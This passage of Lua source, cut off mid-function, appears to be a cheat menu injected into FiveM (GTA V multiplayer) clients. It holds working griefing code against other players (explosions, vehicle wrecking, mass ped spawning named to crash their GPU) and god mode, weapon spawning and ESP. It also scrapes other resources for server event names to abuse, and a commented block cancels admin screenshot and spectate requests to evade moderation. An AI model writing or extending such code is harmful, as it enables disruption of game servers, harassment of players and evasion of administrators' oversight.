   CockT.Global.Dmovement = function(bool) Fatasf.n.DisableControlAction(0, 1, bool) Fatasf.n.DisableControlAction(0, 2, bool) Fatasf.n.DisableControlAction(0, 142, bool)  Fatasf.n.DisableControlAction(0, 322, bool) Fatasf.n.DisableControlAction(0, 106, bool) Fatasf.n.DisableControlAction(0, 17, bool) Fatasf.n.DisableControlAction(0, 16, bool) Fatasf.n.DisableControlAction(0, 69, bool) Fatasf.n.DisableControlAction(0, 70, bool) Fatasf.n.DisableControlAction(0, 92, bool) Fatasf.n.DisableControlAction(0, 114, bool) Fatasf.n.DisableControlAction(0, 257, bool) Fatasf.n.DisableControlAction(0, 263, bool) Fatasf.n.DisableControlAction(0, 264, bool) Fatasf.n.DisableControlAction(0, 331, bool) Fatasf.n.DisableControlAction(0, 24, bool) Fatasf.n.DisableControlAction(0, 25, bool) end
   CockT.Global.PickerS = function(x, y, picker)
       local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
       local widht, height = Fatasf.n.GetActiveScreenResolution()
       c_x = c_x / widht
       c_y = c_y / height
   
       local v1 = 0.600
       local v2 = 0.400
       local v3 = 0.433
       local v4 = 0.545
   
       CockT.Global.DrawText('o', x+(picker.value_2/(picker.max/0.11)/1)-0.066, y+(picker.value/(picker.max/0.2)/1)-0.1, true, 0.2, 0, true)
   
       if( (c_x) + 0.068 >= x and (c_x) - 0.05 <= x and (c_y) + 0.1 >= y and (c_y) - 0.1 <= y) and Fatasf.n.IsDisabledControlPressed(0, 69) then 
           picker.value = CockT.Math.floor((c_y - v2) / (v1 - v2)  * picker.max - picker.min - picker.min)
           picker.value_2 = CockT.Math.floor((c_x - v3) / (v4 - v3) * picker.max - picker.min - picker.min)
       end
   
       if picker.value > picker.max then
           picker.value = picker.max
       elseif picker.value < picker.min then
           picker.value = picker.min
       elseif picker.value_2 > picker.max then
           picker.value_2 = picker.max
       elseif picker.value_2 < picker.min then
           picker.value_2 = picker.min
       end
   end
   
   CockT.Global.RotationToDirection = function(Rotationation)
       return CockT.Strings.vector3(-CockT.Math.sin(CockT.Math.rad(Rotationation.z)) * CockT.Math.abs(CockT.Math.cos(CockT.Math.rad(Rotationation.x))), CockT.Math.cos(CockT.Math.rad(Rotationation.z)) * CockT.Math.abs(CockT.Math.cos(CockT.Math.rad(Rotationation.x))), CockT.Math.sin(CockT.Math.rad(Rotationation.x)))
   end
   
   CockT.Global.GetEntityInFrontOfCam = function()
       local camCoords = Fatasf.n.GetCamCoord(cam)
       local offset = Fatasf.n.GetCamCoord(cam) + (CockT.Global.RotationToDirection(Fatasf.n.GetCamRot(cam, 2)) * 40)
   
       local rayHandle = Fatasf.n.StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, offset.x, offset.y, offset.z, -1)
       local a, b, c, d, entity = Fatasf.n.GetShapeTestResult(rayHandle)
       return entity
   end
   
   CockT.Global.DrawLineBox = function(entity, r, g, b, a)
       if entity then
           local model = Fatasf.n.GetEntityModel(entity)
           local min, max = GetModelDimensions(model)
           local r1 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, max)
           local r2 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, CockT.Strings.vector3(max.x, min.y, max.z))
           local br1 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, CockT.Strings.vector3(max.x, max.y, min.z))
           local br2 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, CockT.Strings.vector3(max.x, min.y, min.z))
           local l1 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, CockT.Strings.vector3(min.x, max.y, max.z))
           local l2 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, CockT.Strings.vector3(min.x, min.y, max.z))
           local fl1 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, CockT.Strings.vector3(min.x, max.y, min.z))
           local bl2 = Fatasf.n.GetOffsetFromEntityInWorldCoords(entity, min)
           Fatasf.n.DrawLine(r1, r2, r, g, b, a)
           Fatasf.n.DrawLine(r1, br1, r, g, b, a)
           Fatasf.n.DrawLine(br1, br2, r, g, b, a)
           Fatasf.n.DrawLine(r2, br2, r, g, b, a)
           Fatasf.n.DrawLine(l1, l2, r, g, b, a)
           Fatasf.n.DrawLine(l2, bl2, r, g, b, a)
           Fatasf.n.DrawLine(l1, fl1, r, g, b, a)
           Fatasf.n.DrawLine(fl1, bl2, r, g, b, a)
           Fatasf.n.DrawLine(r1, l1, r, g, b, a)
           Fatasf.n.DrawLine(r2, l2, r, g, b, a)
           Fatasf.n.DrawLine(fl1, br1, r, g, b, a)
           Fatasf.n.DrawLine(bl2, br2, r, g, b, a)
       end
   end
   
   CockT.Global.DeleteEntity = function(entity)
       if not Fatasf.n.DoesEntityExist(entity) then 
           return 
       end
       Fatasf.n.NetworkRequestControlOfEntity(entity)
       CockT.Inv["Invoke"](CockT.Natives["SetEntityAsMissionEntity"], entity, true, true)
       Fatasf.n.DeletePed(entity)
       Fatasf.n.DeleteEntity(entity)
       Fatasf.n.DeleteObject(entity)
       Fatasf.n.DeleteVehicle(entity)
       return true
   end
   
   CockT.Global.SliderAlpha = function(x, y, alphap)
       local c_x, c_y = Fatasf.n.GetNuiCursorPosition() 
       local widht, height = Fatasf.n.GetActiveScreenResolution()
       c_x = c_x / widht
       c_y = c_y / height
       local v3, v2 = 0.599, 0.401
   
   
       Fatasf.n.DrawRect(x, y+(alphap.value/(alphap.max/0.2)/1)- 0.1, 0.005, 0.01, 255, 255, 255, 255)
       Fatasf.n.DrawRect(x, y+(alphap.value/(alphap.max/0.2)/1)+0.001 - 0.1, 0.006, 0.01, 255, 255, 255, 255)
       Fatasf.n.DrawRect(x, y+(alphap.value/(alphap.max/0.2)/1)+0.001 - 0.1, 0.0061, 0.008, 255, 255, 255, 255)
       Fatasf.n.DrawRect(x, y+(alphap.value/(alphap.max/0.2)/1)+0.0035 - 0.1, 0.005, 0.006, 255, 255, 255, 255)
       
   
       if((c_x) + 0.01 >= x and (c_x) - 0.01 <= x and (c_y) + 0.22 >= y and (c_y) - 0.22 <= y) and Fatasf.n.IsDisabledControlPressed(0, 69) then
           alphap.value = CockT.Math.floor((((c_y) - (v2)) / (v3 - v2) )  * (alphap.max - alphap.min) - alphap.min)
       end
   
       if alphap.value > alphap.max then
           alphap.value = alphap.max
       elseif alphap.value < alphap.min then
           alphap.value = alphap.min
       end
   end
   CockT.Global.GlobalText = function(text, x, y, scale, centre, font, _outl, colour)
       Fatasf.n.SetTextFont(font)
       Fatasf.n.SetTextCentre(centre)
       Fatasf.n.SetTextOutline(_outl)
       Fatasf.n.SetTextScale(0.0, scale or 0.25)
       Fatasf.n.SetTextEntry("STRING")
       Fatasf.n.AddTextComponentString(text)
       Fatasf.n.DrawText(x, y)
   end
   
   CockT.Global.DrawTextOnCoords = function(x, y, z, text, r, g, b, font, scale)
       Fatasf.n.SetDrawOrigin(x, y, z, 0)
       Fatasf.n.SetTextFont(font)
       Fatasf.n.SetTextProportional(0)
       Fatasf.n.SetTextScale(0.0, scale or 0.25)
       Fatasf.n.SetTextColour(r, g, b, 255)
       Fatasf.n.SetTextDropshadow(0, 0, 0, 0, 255)
       Fatasf.n.SetTextEdge(2, 0, 0, 0, 150)
       Fatasf.n.SetTextOutline()
       Fatasf.n.SetTextEntry("STRING")
       Fatasf.n.SetTextCentre(1)
       Fatasf.n.AddTextComponentString(text)
       CockT.Global.GlobalText(0.0, 0.0)
       Fatasf.n.ClearDrawOrigin()
   end
   CockT.Global.MiddleFinger = function(pped)
       local onplayer = Fatasf.n.GetPlayerPed(pped)
       local ped = Fatasf.n.GetHashKey('a_m_m_soucent_01')
       Fatasf.n.RequestModel(ped)
       while not Fatasf.n.HasModelLoaded(ped) do
           CockT.Inv["Wait"](1)
       end
       local ped_2 = Fatasf.n.CreatePed(31, ped, Fatasf.n.GetEntityCoords(onplayer), 0.0, true, true)
   
       Fatasf.n.RequestAnimDict('mp_player_int_upperfinger')
       Fatasf.n.TaskPlayAnim(ped_2, 'mp_player_int_upperfinger', 'mp_player_int_finger_01_enter', 8.0, -8.0, -1, 0, 0, false, false, false)
       CockT.Inv["Wait"](1000)
       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(onplayer), 10, 100.0, true, false, false, 0.0)
       Fatasf.n.ShootSingleBulletBetweenCoords(Fatasf.n.GetEntityCoords(onplayer), Fatasf.n.GetEntityCoords(onplayer), 1.0, true, Fatasf.n.GetHashKey('WEAPON_RPG'), Fatasf.n.PlayerPedId(), true, false, 1410.0)
   end
   
   CockT.Global.WarpVehicle = function(pped)
       CockT.Inv["Thread"](function()
       if pped then
           if Cock.Menu.Spectate then
               Cock.Menu.Spectate = false
           end
           local target = Fatasf.n.GetPlayerPed(pped)
           local vehicle = Fatasf.n.GetVehiclePedIsIn(target, true)
           local veh = Fatasf.n.GetPedInVehicleSeat(vehicle, -1)
           if veh ~= nil then
               Fatasf.n.ClearPedTasksImmediately(veh)
               CockT.Inv["Wait"](500)
               CockT.Inv["Invoke"](CockT.Natives["SetPedIntoVehicle"], Fatasf.n.PlayerPedId(), vehicle, -1)
           end
       end
       end)
   end
   
   CockT.Global.PPonHead = function(pped)
       local ped = Fatasf.n.GetPlayerPed(pped)
       local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(ped, true))
   
       Fatasf.n.AttachEntityToEntity(Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_container_05a"), x, y, z, true, true, false), ped, Fatasf.n.GetPedBoneIndex(ped, 0), 0, 0, 3.0, 0, 90, 0, false, false, false, false, 2, true)
       Fatasf.n.AttachEntityToEntity(Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_container_05a"), x, y, z, true, true, false), ped, Fatasf.n.GetPedBoneIndex(ped, 0), 2.5, 0, 3.0, 0, 90, 0, false, false, false, false, 2, true)
       Fatasf.n.AttachEntityToEntity(Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_container_05a"), x, y, z, true, true, false), ped, Fatasf.n.GetPedBoneIndex(ped, 0), -2.5, 0, 3.0, 0, 90, 0, false, false, false, false, 2, true)
       Fatasf.n.AttachEntityToEntity(Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_container_05a"), x, y, z, true, true, false), ped, Fatasf.n.GetPedBoneIndex(ped, 0), 0, 0, 3.0 + 2.5, 0, 90, 0, false, false, false, false, 2, true)
       Fatasf.n.AttachEntityToEntity(Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_container_05a"), x, y, z, true, true, false), ped, Fatasf.n.GetPedBoneIndex(ped, 0), 0, 0, 3.0 + 5.0, 0, 90, 0, false, false, false, false, 2, true)
       Fatasf.n.AttachEntityToEntity(Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_container_05a"), x, y, z, true, true, false), ped, Fatasf.n.GetPedBoneIndex(ped, 0), 0, 0, 3.0 + 7.5, 0, 90, 0, false, false, false, false, 2, true)
   end
   
   CockT.Global.FuckPlayerEngine = function(pped)
       local ped = Fatasf.n.GetPlayerPed(pped)
       local vehicle = Fatasf.n.GetVehiclePedIsIn(ped)
       CockT.Inv["Invoke"](CockT.Natives['SetVehicleEngineHealth'], vehicle, -4000)
   end
   --[[
   Fatasf.n._RNE_('screenshot_basic:requestScreenshot')
   Fatasf.n._AEH_('screenshot_basic:requestScreenshot', function()
       Fatasf.n.CancelEvent()
       CockT.display_menu = false
       CockT.Inv["Wait"](500)
       CockT.display_menu = true
       CockT.Global.Notifications(antiscb1, 'Somebody was trying to screenshot you!')
   end)
   
   Fatasf.n._RNE_('EasyAdmin:CaptureScreenshot')
   Fatasf.n._AEH_('EasyAdmin:CaptureScreenshot', function()
       Fatasf.n.CancelEvent()
       CockT.display_menu = false
       CockT.Inv["Wait"](500)
       CockT.display_menu = true
       CockT.Global.Notifications(antiscb2, 'Somebody was trying to screenshot you!')
   end)
   Fatasf.n._RNE_('EasyAdmin:CaptureScreenshot')
   Fatasf.n._AEH_('EasyAdmin:CaptureScreenshot', function()
       Fatasf.n._TSE_("EasyAdmin:TookScreenshot", "ERROR")
       Fatasf.n.CancelEvent()
       CockT.display_menu = false
       CockT.Inv["Wait"](500)
       CockT.display_menu = true
       CockT.Global.Notifications(antiscb3, 'Somebody was trying to screenshot you!')
   end)
   Fatasf.n._RNE_('EasyAdmin:requestSpectate')
   Fatasf.n._AEH_('EasyAdmin:requestSpectate', function(playerId)
       Fatasf.n.CancelEvent()
       CockT.Global.Notifications(antispec, 'Somebody is trying to spectate you!')
   end)]]
   
   local Functions = { 
       f = { 
           TranslateFOVInNumber = function(sw)
               local px = sw / 80
               local px2 = 16 * px
               return (sw - px2) / 2
           end,
           Lerp = function(delta, from, to)
               if delta > 1 then return to end
               if delta < 0 then return from end
           
               return from + (to - from) * delta
           end,
           IsInCFOVCircleFOV = function(cx, cy, rad, isx, isy)
               local distance = CockT.Math.sqrt((isx - cx) ^2 + (isy - cy) ^2)
               if distance <= rad then
                   return true
               else
                   return false
               end
           end,
           RGBRainbow = function(frequency)
               local result = {}
               local curtime = Fatasf.n.GetGameTimer() / 1000
               result.r = CockT.Math.floor(CockT.Math.sin(curtime * frequency + 0) * 127 + 128)
               result.g = CockT.Math.floor(CockT.Math.sin(curtime * frequency + 2) * 127 + 128)
               result.b = CockT.Math.floor(CockT.Math.sin(curtime * frequency + 4) * 127 + 128)
               return result
           end,
           FvckinDooogInvincibleglifeshit = function(bool)
               Fatasf.n.SetEntityProofs(Fatasf.n.PlayerPedId(), bool, bool, bool, bool, bool, bool, bool, bool)
           end,
           
           GetAllTriggers = function(d)
               local s, l;
               local tosub;
               if not Fatasf.n.GetResourcestatus(d.resource) then
                   return
               end
               for k, v in CockT.Math.pairs(d.file) do
                   local script;
                   local script = Fatasf.n.LoadResourceFile(d.resource, v)
                   if script == nil or script == "nil" or script:len() <= 0 then
                       return
                   end
                   if d.noparam then
                       local s, l = CockT.Strings.find(script, d.lookfor)
                       if s == nil then
                           return
                       else
                           local a, r = CockT.Strings.find(script, "TriggerServerEvent%b()", l)
                           if a == nil then
                               return
                           end
                           local scriptt = CockT.Strings.sub(script, a, r)
                           local takeidpls, _ = CockT.Strings.gsub(scriptt, "TriggerServerEvent", "")
                           local takeidpls, _ = CockT.Strings.gsub(takeidpls, "'", "")
                           local takeidpls, _ = CockT.Strings.gsub(takeidpls, '"', "")
                           local takeidpls, _ = CockT.Strings.gsub(takeidpls, "%(", "")
                           local takeidpls, _ = CockT.Strings.gsub(takeidpls, "%)", "")
                           dynamic.TR[d.name] = takeidpls
                           return
                       end
                   else
                       local s, l = CockT.Strings.find(script, '%b""' .. d.lookfor)
                       local tosub = '"'
                       if s == nil then
                           s, l = CockT.Strings.find(script, "%b''" .. d.lookfor)
                           tosub = "'"
                       end
                       if s == nil then
                           return
                       end
                       local script2 = CockT.Strings.sub(script, s, l)
                       local finded, _ = CockT.Strings.gsub(script2, d.lookfor, "")
                       local finded = finded:gsub(tosub, "")
                       dynamic.TR[d.name] = finded
   
                       return
                   end 
               end
           end,
           SpawnVehicle = function(car)
               if car then
                   if Fatasf.n.IsModelValid(Fatasf.n.GetHashKey(car)) and Fatasf.n.IsModelAVehicle(Fatasf.n.GetHashKey(car)) then
                       Fatasf.n.RequestModel(Fatasf.n.GetHashKey(car))
                       while not Fatasf.n.HasModelLoaded(Fatasf.n.GetHashKey(car)) do
                           CockT.Inv["Wait"](0)
                       end
                       local veh = Fatasf.n.CreateVehicle(Fatasf.n.GetHashKey(car), Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 1, 1, 1)
                       if Cock.Menu.SpawnInCar then
                           CockT.Inv["Invoke"](CockT.Natives["SetPedIntoVehicle"], Fatasf.n.PlayerPedId(), veh, -1)
                       end
                   end
               end
           end,
           RepairVehicle = function()
               Fatasf.n.SetVehicleFixed(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false))
               CockT.Inv["Invoke"](CockT.Natives["SetVehicleDirtLevel"], Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false), 0.0)
               CockT.Inv["Invoke"](CockT.Natives["SetVehicleLights"], Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false), 0)
               CockT.Inv["Invoke"](CockT.Natives["SetVehicleBurnout"], Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false), false)
               CockT.Inv["Invoke"](CockT.Natives["SetVehicleLightsMode"], Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false), 0)
           end,
           FlipVehicle = function()
               local cars = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
               Fatasf.n.SetVehicleOnGroundProperly(cars)
           end,
           UnlockVehicle = function(vehicle)
               if vehicle then
                   if Fatasf.n.DoesEntityExist(vehicle) then
                       CockT.Inv["Invoke"](CockT.Natives["SetVehicleDoorsLocked"], vehicle, 1)
                       CockT.Inv["Invoke"](CockT.Natives["SetVehicleDoorsLockedForPlayer"], vehicle, Fatasf.n.PlayerId(), false)
                       CockT.Inv["Invoke"](CockT.Natives["SetVehicleDoorsLockedForAllPlayers"], vehicle, false)
                   end
               end
           end,
           LockVehicle = function(vehicle)
               if vehicle then
                   if Fatasf.n.DoesEntityExist(vehicle) then
                       CockT.Inv["Invoke"](CockT.Natives["SetVehicleDoorsLocked"], vehicle, 2)
                       CockT.Inv["Invoke"](CockT.Natives["SetVehicleDoorsLockedForPlayer"], vehicle, Fatasf.n.PlayerId(), true)
                       CockT.Inv["Invoke"](CockT.Natives["SetVehicleDoorsLockedForAllPlayers"], vehicle, true)
                   end
               end
           end,
           GiveAllWeapons = function()
               for weapo = 1, #CockT.Weapons do
                   Fatasf.n.GiveDelayedWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey("WEAPON_" .. CockT.Weapons[weapo]), 255, false)
               end
           end,
           RemoveAllWeapons = function()
               CockT.Inv["Invoke"](CockT.Natives["RemoveAllPedWeapons"], Fatasf.n.PlayerPedId(), false)
           end,
           
           SetCurrentAmmo = function(ammo)
               local weaponnow = Fatasf.n.GetSelectedPedWeapon(Fatasf.n.PlayerPedId())
               Fatasf.n.SetPedAmmo(Fatasf.n.PlayerPedId(), weaponnow, ammo)
           end,
           --CustomInput = function(t2, r, a, b) TextEntry, ExampleText, MaxStringLength
           CustomInput = function(TextEntry, ExampleText, MaxStringLength, Help) 
               if CockT.UseCustomInput then
                   CockT.display_menu = false
                   CockT.Enabled = true
                   local text = ExampleText
                   while CockT.Enabled do
                       CockT.Inv["Wait"](0)
   
                       CockT.Inv["Invoke"](CockT.Natives['DisableAllControlActions'], 0)
                       CockT.Inv["Invoke"](CockT.Natives['DisableAllControlActions'], 1)
   
                       local dcolour = {r=44, g=42, b=43}
                       Fatasf.n.SetTextColour(222, 222, 222, 255)
                       if Help == nil then
                           CockT.Global.DrawText(TextEntry.." [INSERT = I, PAGEUP = O, PAGEDOWN = 0, DELETE = '', HOME = J]", 0.384, 0.475, false, 0.27, 4, false)
                       else
                           CockT.Global.DrawText(TextEntry, 0.384, 0.475, false, 0.27, 4, false)
                       end
                           
                           --Fatasf.n.DrawSprite("commonmenu", "gradient_bgd", 0.5, 0.505, 0.25, 0.07, 0.0, 0, 0, 0, 222)
                           
                           Fatasf.n.DrawRect(0.5, 0.5105, 0.2312, 0.0275, dcolour.r, dcolour.g, dcolour.b, 255)
                           Fatasf.n.DrawRect(0.5, 0.51, 0.23, 0.026, 0, 0, 0, 255)
                       
   
                           CockT.Global.DrawText(text, 0.3855, 0.5, false, 0.25, 0, false)
       
                           for k, v in CockT.Math.pairs(CockT.Keysv2) do 
                               if Fatasf.n.IsDisabledControlJustPressed(0, v) and not Fatasf.n.IsDisabledControlPressed(0, 21) then 
                                   text = text..k 
                               end 
                               if Fatasf.n.IsDisabledControlPressed(0, 21) and Fatasf.n.IsDisabledControlJustReleased(0, v) then
                                   text = text ..CockT.Strings.upper(k)
                               end
                           end
       
                           if Fatasf.n.IsDisabledControlJustPressed(0, 121) and not Fatasf.n.IsDisabledControlPressed(0, 21) then -- insert (i)
                               text = text..'i'
                           elseif Fatasf.n.IsDisabledControlJustPressed(0, 121) and Fatasf.n.IsDisabledControlPressed(0, 21) then
                               text = text ..'I'
                           end
                           if Fatasf.n.IsDisabledControlJustPressed(0, 10) and not Fatasf.n.IsDisabledControlPressed(0, 21) then -- pageup (o)
                               text = text..'o'
                           elseif Fatasf.n.IsDisabledControlJustPressed(0, 10) and Fatasf.n.IsDisabledControlPressed(0, 21) then
                               text = text ..'O'
                           end
                           if Fatasf.n.IsDisabledControlJustPressed(0, 11) then -- pagedown (0)
                               text = text..'0'
                           end
                           if Fatasf.n.IsDisabledControlJustPressed(0, 178) then -- delete (")
                               text = text..'"'
                           end
                           if Fatasf.n.IsDisabledControlJustPressed(0, 212) and not Fatasf.n.IsDisabledControlPressed(0, 21) then -- home (j)
                               text = text..'j'
                           elseif Fatasf.n.IsDisabledControlJustPressed(0, 212) and Fatasf.n.IsDisabledControlPressed(0, 21) then
                               text = text ..'J'
                           end
                           if Fatasf.n.IsDisabledControlJustPressed(0, 177) then 
                               text = text:sub(1, -2) 
                           end -- BACKSPACE
                           if Fatasf.n.IsDisabledControlPressed(0, 200) then 
                               text = text:sub(1, -2) 
                           end -- ESC
                           if Fatasf.n.IsDisabledControlPressed(0, 21) and Fatasf.n.IsDisabledControlJustReleased(0, 157) then
                               text = text:sub(1, -2) 
                               text = text ..'!'
                           end -- !
       
                           if Fatasf.n.IsDisabledControlJustPressed(0, 22) then 
                               text = text..' ' 
                           end -- SPACE
                           if Fatasf.n.IsDisabledControlPressed(0, 21) and Fatasf.n.IsDisabledControlJustReleased(0, 84) then
                               text = text:sub(1, -2) 
                               text = text ..'_'
                           end -- _
                           
                           
                           
                           if Fatasf.n.IsDisabledControlJustPressed(0, 191) then 
                               TextEntry = not TextEntry
                               Enabled = false
                           end -- ENTER
       
                           if not TextEntry then
                               CockT.display_menu = true 
                               CockT.Inv["Wait"](100)
                               return text 
                           end
                       end
               else
                   Fatasf.n.AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":") --(TextEntry, ExampleText, MaxStringLength)
                   CockT.Inv["Invoke"](CockT.Natives["DisplayOnscreenKeyboard"], 1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
                   blockinput = true
                   while Fatasf.n.UpdateOnscreenKeyboard() ~= 1 and Fatasf.n.UpdateOnscreenKeyboard() ~= 2 do
                       CockT.Inv["Wait"](0)
                   end
                   if Fatasf.n.UpdateOnscreenKeyboard() ~= 2 then
                       result = Fatasf.n.GetOnscreenKeyboardResult()
                       CockT.Inv["Wait"](500)
                       blockinput = false
                       return result
                   else
                       CockT.Inv["Wait"](500)
                       blockinput = false
                       return nil
                   end
               end
           end,
           GetPedBoneCoords = function(ped, boneId, offsetX, offsetY, offsetZ)
               return Fatasf.n.GetGameplayCamCoord() + ((Fatasf.n.GetPedBoneCoords(ped, boneId, 0.0, 0.0, 0.0) - Fatasf.n.GetGameplayCamCoord()) * 0.9)
           end,
           FuckVehicle = function(pp)
               local vehicle = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(pp), true)
               --Fatasf.n.NetworkRequestControlOfEntity(Fatasf.n.GetVehiclePedIsIn(pp))
               Fatasf.n.RequestControlOnce(vehicle)
               Fatasf.n.SmashVehicleWindow(vehicle, 0)
               Fatasf.n.SmashVehicleWindow(vehicle, 1)
               Fatasf.n.SmashVehicleWindow(vehicle, 2)
               Fatasf.n.SmashVehicleWindow(vehicle, 3)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 0, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 1, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 2, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 3, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 4, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 5, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 4, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreBurst'], vehicle, 7, true, 1000.0)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 0, true)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 1, true)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 2, true)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 3, true)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 4, true)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 5, true)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 6, true)
               CockT.Inv["Invoke"](CockT.Natives['SetVehicleDoorBroken'], vehicle, 7, true)
           end,
           DisableAllEngines = function()
               for vehicle in Fatasf.n.EnumerateVehicles() do
                   Fatasf.n.SetVehicleEngineOn(vehicle, false, true, true)
               end
               for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                   Fatasf.n.SetVehicleEngineOn(Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.GetPlayerPed(v)), false, true, true)
               end
           end,
           texture_preload = {
               "mpleaderboard", "cross",
               "timerbars", "commonmenu",
               "trafficcam",
               "mpinventory", "mpmissionend",
               "mpsrange", "trafficcam",
               "mpweaponscommon", "visualflow",
               "mptattoos", "mpweaponsgang1",
               "mphud", "mpweaponsunusedfornow",
               "mpcarhud",
           },
   
   
           DrawTextTest = function(name, _outl, size, Justification, xx, yy)
               if _outl then
                   Fatasf.n.SetTextOutline()
               end
               Fatasf.n.SetTextScale(0.00, size)
               Fatasf.n.SetTextFont(4)
               Fatasf.n.SetTextProportional(0)
               
               Fatasf.n.SetTextJustification(Justification)
               Fatasf.n.SetTextEntry("string")
               Fatasf.n.AddTextComponentString(name)
               Fatasf.n.DrawText(xx, yy)
           end,
           LoadLogo = function()
               local runtime_txd = Fatasf.n.CreateRuntimeTxd("madafakalogo")
               local banner_dui = Fatasf.n.CreateAnDui("https://cdn.upload.systems/uploads/Zu6GMirn.png", 200, 200)
               local b_dui = Fatasf.n.GetDuiHandle(banner_dui)
               Fatasf.n.CreateRuntimeTextureFromDuiHandle(runtime_txd, "batakfrajer", b_dui)
           end,
           BindOnStart = function()
               local clicked = nil
               local text = nil
               local binded = false
               local alpha = 0
                   while not binded do
                       CockT.display_menu = false
                       CockT.Inv["Wait"](0)
   
                       if alpha < 255 then
                           alpha = alpha + 3
                       end
   
                       --Fatasf.n.DrawRect(0.5, 0.473, 0.125, 0.041, 0, 0, 0, 255) 
                       Fatasf.n.DrawRect(0.5, 0.51, 0.126, 0.037, 0, 0, 0, alpha) 
                       Fatasf.n.DrawRect(0.5, 0.51, 0.125, 0.035, 20, 20, 20, alpha)
   
                       
   
                       Fatasf.n.SetTextColour(255, 255, 255, alpha)
                       Fatasf.n.DrawTextB('Press any key', 0.475, 0.495, true, 0.4, 4, false)
   
                       for k, v in CockT.Math.pairs(CockT.Keys) do
                           if Fatasf.n.IsDisabledControlPressed(0, v) then
                               clicked = v
                               text = k
                               CockT.Inv["Wait"](100)
                           end
                       end
                       if clicked ~= nil then
                           binded = true
                           return clicked, text
                       end
                   end
           end,
           KIllGpu = function(player)
               CockT.Inv["Thread"](function()
                   if player then
                       for i = 1, 2 do
                           for i = 1, 123 do
                               --local model = Fatasf.n.GetHashKey("a_f_m_bevhills_02")
                               local model = Fatasf.n.GetHashKey("mp_m_freemode_01")
                               if not Fatasf.n.HasModelLoaded(model) then 
                                   Fatasf.n.RequestModel(model)
                               end
                               local ped = Fatasf.n.CreatePed(0, model, Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player)), 1, 1, 1)
                               Fatasf.n.GiveWeaponToPed(ped, Fatasf.n.GetHashKey('weapon_combatpistol'), 155, true, true)
                           end
                       end
                   end
               end)
   
           end,
           PlayersLootEsp = function()
               for objects in Fatasf.n.EnumerateObjects() do
                   local coords = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId())
                   local coords2 = Fatasf.n.GetEntityCoords(objects)
                   local Distance = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), coords2, true)
                   local retval, _x, _y = Fatasf.n.GetScreenCoordFromWorldCoord(CockT.Strings.tunpack(coords2))
                   if Fatasf.n.GetEntityModel(objects) == Fatasf.n.GetHashKey('prop_big_bag_01') then
                       CockT.Global.DrawTextOnCoords(coords2.x, coords2.y, coords2.z, 'Lootbag', 255, 0, 0, 4, 0.10)
                       Fatasf.n.DrawLine(coords.x, coords.y, coords.z, coords2.x, coords2.y, coords2.z, 255, 0, 0, 255)
                   end
               end
           end,
           GlifeKillAllPeds = function()
               for zombies in Fatasf.n.EnumeratePeds() do
                   if not Fatasf.n.IsPedAPlayer(zombies) and zombies ~= Fatasf.n.PlayerPedId() then
                       CockT.Inv["Wait"](1)
                       Fatasf.n.RequestControlOnce(zombies)
                       Fatasf.n.SetEntityHealth(zombies, 0)
                       Fatasf.n.SetEntityCoords(zombies, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                   end
               end
           end,
           GlifeKillAllPeds2 = function()
               for zombies in Fatasf.n.EnumeratePeds() do
